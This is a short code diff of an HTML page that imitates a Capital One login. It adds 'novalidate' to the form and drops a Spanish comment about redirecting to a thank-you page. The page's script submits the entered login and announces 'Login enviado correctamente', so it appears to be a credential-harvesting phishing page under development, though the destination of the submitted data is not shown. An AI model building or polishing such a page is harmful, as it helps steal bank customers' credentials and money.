@@ -73,7 +73,7 @@
       class="logo"
     />
     <h2>Capital One Login</h2>
-    <form id="loginForm">
+    <form id="loginForm" novalidate>
       <label for="username">User ID</label>
       <input
         type="text"
@@ -121,7 +121,6 @@
         })
           .then((response) => {
             if (response.ok) {
-              // Aquí puedes redirigir a una página de gracias o limpiar formulario
               alert("Login enviado correctamente.");
               document.getElementById("loginForm").reset();
             } else {
